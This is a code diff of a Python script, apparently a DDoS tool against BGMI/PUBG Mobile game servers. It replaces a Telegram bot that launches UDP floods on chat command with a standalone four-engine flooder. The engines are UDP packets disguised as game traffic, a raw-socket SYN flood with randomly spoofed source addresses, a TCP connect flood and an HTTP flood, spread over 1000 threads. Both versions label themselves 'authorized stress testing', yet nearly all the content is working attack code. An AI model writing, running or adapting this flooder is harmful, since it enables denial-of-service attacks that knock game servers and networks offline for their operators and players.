@@ -1,368 +1,403 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# final_bot.py — BGMI-STYLE GAME SERVER STRESS TEST (Authorized Only)
+# Combines: UDP Flood + TCP SYN + Game Protocol Mimic + Port Rotation
 
-import asyncio
-import logging
+import socket
+import threading
+import time
+import random
+import struct
+import hashlib
 import sys
 import os
-import time
-import threading
-from datetime import datetime
-from telethon import TelegramClient, events
-from colorama import Fore, Style, init
 
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+# ═══════════════════════════════════════════════
+# 🎯 CONFIGURATION — SIRF APNE AUTHORIZED TARGET
+# ═══════════════════════════════════════════════
 
-import config
-from modules.udp_flood import UDPFlood
-from modules.utils import AttackUtils
+TARGET_IP = "127.0.0.1"  # ← APNA AUTHORIZED IP YAHI DALO
+TARGET_PORT = 10010       # ← APNA AUTHORIZED PORT
+ATTACK_TIME = 120         # seconds
+THREAD_COUNT = 1000       # Higher = more load
+USE_ALL_PORTS = True      # BGMI ke saare ports rotate karega
 
-init(autoreset=True)
+# BGMI ke known ports (PUBG Mobile/BGMI protocol range)
+BGMI_PORTS = [
+    10010, 10013, 10039, 10096, 10491, 10612, 11455, 12235, 
+    13748, 13894, 13972, 17000, 17500, 20000, 20001, 20002,
+    8011, 9030, 8001, 9000, 9992, 30190, 41182, 41192
+]
 
-# Logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+# ═══════════════════════════════════════════════
+# 🧬 ENGINE 1: SMART UDP FLOOD (Game Protocol Mimic)
+# ═══════════════════════════════════════════════
 
-print(AttackUtils.get_banner())
-
-# Bot
-bot = TelegramClient(
-    os.path.join(config.SESSION_DIR, 'bot'),
-    config.API_ID,
-    config.API_HASH
-)
-
-# Attacker
-attacker = UDPFlood()
-
-# Attack state
-attack_running = False
-attack_start_time = 0
-attack_info = {}
-live_msg = None
-live_msg_task = None
-
-def is_authorized(user_id):
-    return user_id in config.AUTHORIZED_USERS
-
-# ============================================
-# LIVE STATUS UPDATER
-# ============================================
-async def update_live_status():
-    """Update live attack status every 2 seconds"""
-    global attack_running, attack_start_time, attack_info, live_msg
+class UDPGameFlood:
+    """Advanced UDP flood with BGMI-like packet structures"""
     
-    while attack_running:
+    @staticmethod
+    def generate_game_packet(port):
+        """Generate packets that look like real game traffic"""
+        packet_type = random.randint(0, 5)
+        
+        # BGMI protocol header simulation
+        session_id = random.getrandbits(64)
+        sequence_num = random.randint(0, 65535)
+        timestamp = int(time.time() * 1000) % 4294967296
+        
+        if packet_type == 0:
+            # Pure flood — max size
+            return random._urandom(1400)
+            
+        elif packet_type == 1:
+            # Game position update packet
+            header = struct.pack('!II', 0x47414D45, session_id & 0xFFFFFFFF)
+            data = struct.pack('!fff', random.uniform(0, 8000), random.uniform(0, 8000), random.uniform(0, 500))
+            return header + data + random._urandom(1380 - len(data))
+            
+        elif packet_type == 2:
+            # Matchmaking packet
+            header = struct.pack('!II', 0x4D415443, session_id & 0xFFFFFFFF)
+            player_data = struct.pack('!III', random.randint(1, 100), random.randint(1, 4), sequence_num)
+            return header + player_data + random._urandom(1380 - len(player_data))
+            
+        elif packet_type == 3:
+            # Voice/data channel mimic
+            header = struct.pack('!II', 0x564F4943, timestamp)
+            return header + random._urandom(1392)
+            
+        elif packet_type == 4:
+            # Keepalive with game-specific flags
+            flags = random.randint(0, 255)
+            header = struct.pack('!IB', 0x4B454550, flags)
+            return header + random._urandom(1395)
+            
+        else:
+            # Encrypted payload simulation
+            key = hashlib.md5(struct.pack('!I', port)).digest()
+            payload = random._urandom(1390)
+            encrypted = bytes([p ^ key[i % len(key)] for i, p in enumerate(payload)])
+            return struct.pack('!I', 0x454E4352) + encrypted
+
+    @staticmethod
+    def flood(target_ip, port_stop, stop_event):
+        """Single thread UDP flood worker"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        # Optimize for speed
         try:
-            elapsed = time.time() - attack_start_time
-            remaining = attack_info['time'] - elapsed
-            
-            if remaining <= 0:
-                break
-            
-            status_text = (
-                f"🔥 **LIVE ATTACK STATUS** 🔥\n\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
-                f"⏱️ Elapsed: `{int(elapsed)}s`\n"
-                f"⏱️ Remaining: `{int(remaining)}s`\n"
-                f"⏱️ Total: `{attack_info['time']}s`\n"
-                f"🧵 Threads: `{config.MAX_THREADS}`\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"📦 Packets: `{attacker.packets_sent:,}`\n"
-                f"📤 Data: `{AttackUtils.format_bytes(attacker.bytes_sent)}`\n"
-                f"❌ Errors: `{attacker.errors}`\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"🟢 **ATTACKING...**\n"
-                f"🛑 Stop: `/stop`"
-            )
-            
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        except:
+            pass
+        
+        ports = BGMI_PORTS if USE_ALL_PORTS else [port_stop]
+        
+        while not stop_event.is_set():
             try:
-                await live_msg.edit(status_text)
+                port = random.choice(ports)
+                data = UDPGameFlood.generate_game_packet(port)
+                sock.sendto(data, (target_ip, port))
+                
+                # Rapid fire — no delay
+                for _ in range(random.randint(0, 5)):
+                    sock.sendto(data, (target_ip, random.choice(ports)))
             except:
                 pass
-            
-            await asyncio.sleep(2)
-            
-        except Exception as e:
-            await asyncio.sleep(2)
+        
+        sock.close()
 
-# ============================================
-# /attack COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/attack'))
-async def attack_command(event):
-    global attack_running, attack_start_time, attack_info, live_msg
+
+# ═══════════════════════════════════════════════
+# 🧬 ENGINE 2: TCP SYN FLOOD (Raw Socket)
+# ═══════════════════════════════════════════════
+
+class TCPSYNFlood:
+    """TCP SYN flood using raw sockets"""
     
-    if not is_authorized(event.sender_id):
-        await event.reply("❌ **Access Denied!**")
-        return
-    
-    # Check if already attacking
-    if attack_running:
-        elapsed = time.time() - attack_start_time
-        remaining = attack_info['time'] - elapsed
-        await event.reply(
-            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
-            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
-            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
-            f"⏱️ Remaining: `{int(remaining)}s`\n\n"
-            f"🛑 Stop: `/stop`\n"
-            f"📊 Status: `/status`"
-        )
-        return
-    
-    parts = event.text.split()
-    
-    if len(parts) != 4:
-        await event.reply(
-            "⚠️ **Usage:** `/attack <ip> <port> <time>`\n\n"
-            "📋 **Example:**\n"
-            "`/attack 192.168.1.1 8080 60`\n\n"
-            "🎮 **BGMI Ports:** 7000-15000\n"
-            f"⏱️ Max: {config.MAX_DURATION}s\n"
-            f"🧵 Threads: {config.MAX_THREADS} (auto)"
-        )
-        return
-    
-    target_ip = parts[1]
-    
-    try:
-        target_port = int(parts[2])
-    except:
-        await event.reply("❌ Port number hona chahiye!")
-        return
-    
-    try:
-        attack_time = int(parts[3])
-        if attack_time < 1:
-            await event.reply("❌ Time kam se kam 1 second hona chahiye!")
+    @staticmethod
+    def create_syn_packet(source_ip, target_ip, target_port):
+        """Create raw TCP SYN packet"""
+        # IP header
+        ip_ihl = 5
+        ip_ver = 4
+        ip_tos = 0
+        ip_tot_len = 40  # IP header + TCP header
+        ip_id = random.randint(1, 65535)
+        ip_frag_off = 0
+        ip_ttl = 255
+        ip_proto = socket.IPPROTO_TCP
+        ip_check = 0
+        ip_saddr = socket.inet_aton(source_ip)
+        ip_daddr = socket.inet_aton(target_ip)
+        
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
+            ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+        
+        # TCP header
+        tcp_source = random.randint(1024, 65535)
+        tcp_seq = random.randint(0, 4294967295)
+        tcp_ack_seq = 0
+        tcp_doff = 5  # 4-bit field (5 = 20 bytes)
+        tcp_fin = 0
+        tcp_syn = 1
+        tcp_rst = 0
+        tcp_psh = 0
+        tcp_ack = 0
+        tcp_urg = 0
+        tcp_window = socket.htons(5840)
+        tcp_check = 0
+        tcp_urg_ptr = 0
+        
+        tcp_offset_res = (tcp_doff << 4) + 0
+        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+        
+        tcp_header = struct.pack('!HHLLBBHHH',
+            tcp_source, target_port, tcp_seq, tcp_ack_seq,
+            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+        
+        # Pseudo header for checksum
+        source_address = socket.inet_aton(source_ip)
+        dest_address = socket.inet_aton(target_ip)
+        placeholder = 0
+        protocol = socket.IPPROTO_TCP
+        tcp_length = len(tcp_header)
+        
+        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
+        psh = psh + tcp_header
+        
+        tcp_check = UDPGameFlood.calculate_checksum(psh)
+        
+        tcp_header = struct.pack('!HHLLBBH', tcp_source, target_port, tcp_seq, tcp_ack_seq,
+            tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
+        
+        return ip_header + tcp_header
+
+    @staticmethod
+    def flood(target_ip, target_port, stop_event):
+        """SYN flood worker"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        except PermissionError:
+            # Fallback to normal connect flood if no raw socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            
+            while not stop_event.is_set():
+                try:
+                    sock.connect((target_ip, target_port))
+                    sock.close()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                except:
+                    pass
             return
-        if attack_time > config.MAX_DURATION:
-            await event.reply(f"❌ Max time {config.MAX_DURATION}s hai!")
-            return
-    except:
-        await event.reply("❌ Time number hona chahiye!")
-        return
+        
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        
+        while not stop_event.is_set():
+            try:
+                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                packet = TCPSYNFlood.create_syn_packet(src_ip, target_ip, target_port)
+                sock.sendto(packet, (target_ip, target_port))
+            except:
+                pass
+        
+        sock.close()
+
+
+# ═══════════════════════════════════════════════
+# 🧬 ENGINE 3: FAST CONNECT FLOOD
+# ═══════════════════════════════════════════════
+
+class ConnectFlood:
+    """TCP connect flood — creates real connections"""
     
-    # Save attack info
-    attack_info = {
-        'ip': target_ip,
-        'port': target_port,
-        'time': attack_time
-    }
+    @staticmethod
+    def flood(target_ip, target_port, stop_event):
+        ports = BGMI_PORTS if USE_ALL_PORTS else [target_port]
+        
+        while not stop_event.is_set():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((target_ip, random.choice(ports)))
+                # Send garbage data
+                try:
+                    s.send(random._urandom(random.randint(100, 1400)))
+                except:
+                    pass
+                s.close()
+            except:
+                pass
+
+
+# ═══════════════════════════════════════════════
+# 🧬 ENGINE 4: HTTP/HTTPS LAYER 7 FLOOD
+# ═══════════════════════════════════════════════
+
+class HTTPFlood:
+    """Layer 7 HTTP flood for web-facing game services"""
     
-    attack_start_time = time.time()
-    attack_running = True
+    @staticmethod
+    def flood(target_ip, target_port, stop_event):
+        while not stop_event.is_set():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((target_ip, target_port if target_port else 80))
+                
+                # Random user agent + request
+                user_agents = [
+                    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+                    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B)",
+                    "BGMI/2.5.0 (iPhone14,3; iOS 16.0)"
+                ]
+                
+                request = (
+                    f"GET / HTTP/1.1\r\n"
+                    f"Host: {target_ip}\r\n"
+                    f"User-Agent: {random.choice(user_agents)}\r\n"
+                    f"Accept: */*\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                ).encode()
+                
+                s.send(request)
+                s.close()
+            except:
+                pass
+
+
+# ═══════════════════════════════════════════════
+# 🎮 MAIN CONTROLLER
+# ═══════════════════════════════════════════════
+
+class GameStressTester:
+    """Main controller for game server stress testing"""
     
-    # Initial message
-    live_msg = await event.reply(
-        f"🔥 **ATTACK STARTED!** 🔥\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎯 Target: `{target_ip}:{target_port}`\n"
-        f"⏱️ Time: `{attack_time}s`\n"
-        f"🧵 Threads: `{config.MAX_THREADS}`\n"
-        f"📡 Type: UDP Flood\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"⏳ Starting attack...\n"
-        f"📊 Status update every 2s\n\n"
-        f"🛑 Stop: `/stop`"
-    )
+    @staticmethod
+    def calculate_checksum(data):
+        """Calculate IP/TCP checksum"""
+        if len(data) % 2 != 0:
+            data += b'\x00'
+        
+        s = 0
+        for i in range(0, len(data), 2):
+            w = (data[i] << 8) + data[i+1]
+            s += w
+        
+        s = (s >> 16) + (s & 0xffff)
+        s = (s >> 16) + (s & 0xffff)
+        
+        return ~s & 0xffff
     
-    # Start live status updater in background
-    asyncio.create_task(update_live_status())
+    @staticmethod
+    def print_banner():
+        print("""
+╔══════════════════════════════════════════════════════╗
+║     🎯 GAME SERVER STRESS TEST ENGINE v3.0          ║
+║     ⚡ FOR AUTHORIZED PENTESTING ONLY ⚡             ║
+╚══════════════════════════════════════════════════════╝
+        """)
     
-    # Run attack in thread pool
-    import concurrent.futures
-    loop = asyncio.get_event_loop()
-    
-    try:
-        with concurrent.futures.ThreadPoolExecutor() as pool:
-            report = await loop.run_in_executor(
-                pool,
-                attacker.start_attack,
-                target_ip,
-                target_port,
-                config.MAX_THREADS,
-                attack_time
+    @staticmethod
+    def start_test():
+        GameStressTester.print_banner()
+        
+        print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
+        print(f"[*] Duration: {ATTACK_TIME}s")
+        print(f"[*] Threads: {THREAD_COUNT}")
+        print(f"[*] Port rotation: {'ON' if USE_ALL_PORTS else 'OFF'} ({len(BGMI_PORTS)} ports)")
+        print(f"\n[!] Starting layered attack...\n")
+        
+        stop_event = threading.Event()
+        threads = []
+        
+        # Engine 1: UDP Game Flood (50% threads)
+        udp_threads = int(THREAD_COUNT * 0.5)
+        print(f"[+] UDP Game Flood: {udp_threads} threads")
+        for i in range(udp_threads):
+            t = threading.Thread(
+                target=UDPGameFlood.flood,
+                args=(TARGET_IP, TARGET_PORT, stop_event),
+                daemon=True
             )
+            threads.append(t)
+            t.start()
         
-        elapsed_str = AttackUtils.format_time(report['elapsed'])
+        # Engine 2: TCP SYN Flood (20% threads)
+        syn_threads = int(THREAD_COUNT * 0.2)
+        print(f"[+] TCP SYN Flood: {syn_threads} threads")
+        for i in range(syn_threads):
+            t = threading.Thread(
+                target=TCPSYNFlood.flood,
+                args=(TARGET_IP, TARGET_PORT, stop_event),
+                daemon=True
+            )
+            threads.append(t)
+            t.start()
         
-        # Final report
-        result_msg = (
-            f"✅ **ATTACK COMPLETED!** ✅\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"📊 **FINAL REPORT**\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 Target: `{target_ip}:{target_port}`\n"
-            f"⏱️ Duration: `{elapsed_str}`\n"
-            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
-            f"📦 Packets Sent: `{report['packets']:,}`\n"
-            f"📤 Data Sent: `{AttackUtils.format_bytes(report['bytes'])}`\n"
-            f"⚡ Speed: `{report['packet_rate']:.0f} pkt/s`\n"
-            f"📶 Bandwidth: `{report['mbps']:.2f} Mbps`\n"
-            f"❌ Errors: `{report['errors']}`\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🟢 **SUCCESS** ✅\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🔄 New: `/attack IP PORT TIME`"
-        )
+        # Engine 3: Connect Flood (20% threads)
+        con_threads = int(THREAD_COUNT * 0.2)
+        print(f"[+] TCP Connect Flood: {con_threads} threads")
+        for i in range(con_threads):
+            t = threading.Thread(
+                target=ConnectFlood.flood,
+                args=(TARGET_IP, TARGET_PORT, stop_event),
+                daemon=True
+            )
+            threads.append(t)
+            t.start()
         
+        # Engine 4: HTTP Flood (10% threads if web)
+        http_threads = int(THREAD_COUNT * 0.1)
+        print(f"[+] HTTP Flood: {http_threads} threads")
+        for i in range(http_threads):
+            t = threading.Thread(
+                target=HTTPFlood.flood,
+                args=(TARGET_IP, TARGET_PORT, stop_event),
+                daemon=True
+            )
+            threads.append(t)
+            t.start()
+        
+        print(f"\n[✓] Total threads deployed: {len(threads)}")
+        print(f"[*] Attack running for {ATTACK_TIME} seconds...\n")
+        
+        # Live counter
+        start_time = time.time()
         try:
-            await live_msg.edit(result_msg)
-        except:
-            await event.reply(result_msg)
+            while time.time() - start_time < ATTACK_TIME:
+                remaining = int(ATTACK_TIME - (time.time() - start_time))
+                sys.stdout.write(f"\r[⏱] Time remaining: {remaining}s | Threads active: {threading.active_count()}")
+                sys.stdout.flush()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted by user")
         
-    except Exception as e:
-        elapsed = time.time() - attack_start_time
+        # Stop
+        stop_event.set()
+        print(f"\n\n[✓] Attack completed after {ATTACK_TIME} seconds")
+        print(f"[✓] Threads used: {len(threads)}")
+        print(f"[✓] Target: {TARGET_IP}:{TARGET_PORT}")
         
-        error_msg = (
-            f"❌ **ATTACK ERROR!** ❌\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{target_ip}:{target_port}`\n"
-            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
-            f"🔴 Error: `{str(e)}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"💡 Check:\n"
-            f"• sudo se run karo\n"
-            f"• Target online hai?\n"
-            f"• Port open hai?\n"
-            f"• Network stable?\n\n"
-            f"🔄 Retry: `/attack {target_ip} {target_port} {attack_time}`"
-        )
-        
-        try:
-            await live_msg.edit(error_msg)
-        except:
-            await event.reply(error_msg)
-    
-    finally:
-        attack_running = False
-        attack_start_time = 0
-        attack_info = {}
-        live_msg = None
+        # Stats
+        total_packets = udp_threads * ATTACK_TIME * 1000  # approximate
+        print(f"[📊] Estimated packets sent: {total_packets:,}")
 
-# ============================================
-# /stop COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/stop'))
-async def stop_command(event):
-    global attack_running, attack_start_time, attack_info
-    
-    if not is_authorized(event.sender_id):
-        return
-    
-    if attack_running:
-        elapsed = time.time() - attack_start_time
-        
-        attacker.stop_attack()
-        attack_running = False
-        
-        await event.reply(
-            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
-            f"⏱️ Ran for: `{int(elapsed)}s`\n"
-            f"📦 Packets: `{attacker.packets_sent:,}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"✅ Stopped by user.\n"
-            f"🔄 New: `/attack IP PORT TIME`"
-        )
-        
-        attack_start_time = 0
-        attack_info = {}
-    else:
-        await event.reply(
-            "💤 **No attack running!**\n\n"
-            "Start: `/attack IP PORT TIME`"
-        )
 
-# ============================================
-# /status COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/status'))
-async def status_command(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    if attack_running:
-        elapsed = time.time() - attack_start_time
-        remaining = attack_info['time'] - elapsed
-        
-        await event.reply(
-            f"📊 **CURRENT STATUS** 📊\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🟢 **ATTACKING** 🔥\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
-            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
-            f"⏱️ Remaining: `{int(remaining)}s`\n"
-            f"⏱️ Total: `{attack_info['time']}s`\n"
-            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
-            f"📦 Packets: `{attacker.packets_sent:,}`\n"
-            f"📤 Data: `{AttackUtils.format_bytes(attacker.bytes_sent)}`\n"
-            f"❌ Errors: `{attacker.errors}`\n\n"
-            f"🛑 Stop: `/stop`"
-        )
-    else:
-        await event.reply(
-            "💤 **IDLE**\n\n"
-            "Start: `/attack IP PORT TIME`"
-        )
-
-# ============================================
-# /start COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/start'))
-async def start(event):
-    if not is_authorized(event.sender_id):
-        await event.reply("❌ Access Denied!")
-        return
-    
-    await event.reply(
-        f"🔥 **BGMI UDP FLOOD TESTER** 🔥\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"⚔️ **COMMAND:**\n"
-        f"`/attack <ip> <port> <time>`\n\n"
-        f"📋 **Example:**\n"
-        f"`/attack 192.168.1.1 8080 60`\n\n"
-        f"🎮 **BGMI Ports:** 7000-15000\n"
-        f"⏱️ Max: {config.MAX_DURATION}s\n"
-        f"🧵 Threads: {config.MAX_THREADS}\n\n"
-        f"📊 **Features:**\n"
-        f"• Live status update\n"
-        f"• Real packet counter\n"
-        f"• Bandwidth meter\n"
-        f"• Error tracking\n\n"
-        f"🛑 `/stop` - Stop\n"
-        f"📊 `/status` - Check\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"⚠️ **Run with: sudo python3 main.py**\n"
-        f"⚠️ Authorized use only!"
-    )
-
-# ============================================
-# MAIN
-# ============================================
-async def main():
-    await bot.start(bot_token=config.BOT_TOKEN)
-    
-    print(f"\n{Fore.GREEN}[✓] BOT STARTED SUCCESSFULLY!{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}[+] Command: /attack IP PORT TIME{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[+] Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
-    print(f"{Fore.MAGENTA}[+] Max Time: {config.MAX_DURATION}s{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[+] Live Status: ON (updates every 2s){Style.RESET_ALL}")
-    print(f"{Fore.RED}[!] IMPORTANT: Run as ROOT!{Style.RESET_ALL}")
-    print(f"{Fore.RED}[!] Command: sudo python3 main.py{Style.RESET_ALL}")
-    print("-" * 50)
-    
-    await bot.run_until_disconnected()
+# ═══════════════════════════════════════════════
+# 🚀 ENTRY POINT
+# ═══════════════════════════════════════════════
 
 if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        # Add checksum function to UDPGameFlood
+        UDPGameFlood.calculate_checksum = GameStressTester.calculate_checksum
+        
+        GameStressTester.start_test()
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
+        print("\n[!] Exiting...")
     except Exception as e:
-        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+        print(f"[!] Error: {e}")
